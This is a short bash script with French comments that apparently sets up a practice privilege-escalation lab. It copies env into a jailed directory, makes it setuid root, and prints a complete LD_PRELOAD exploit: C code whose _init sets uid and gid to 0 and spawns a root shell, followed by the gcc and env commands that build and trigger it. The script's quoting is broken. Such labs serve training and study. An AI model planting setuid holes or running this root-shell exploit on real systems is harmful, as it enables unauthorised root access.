#!/bin/bash
# Activation d'une élévation via LD_PRELOAD

cp /usr/bin/env /home/jailed/bin/
chmod 4755 /home/jailed/bin/env

echo "✅ LD_PRELOAD exploitable. Exploitation :
echo '#include <stdio.h>
#include <stdlib.h>
void _init() {
    setgid(0);
    setuid(0);
    system(\"/bin/bash\");
}' > /home/jailed/tmp/exploit.c

gcc -fPIC -shared -o /home/jailed/tmp/exploit.so /home/jailed/tmp/exploit.c -nostartfiles
env LD_PRELOAD=/home/jailed/tmp/exploit.so /bin/ls"
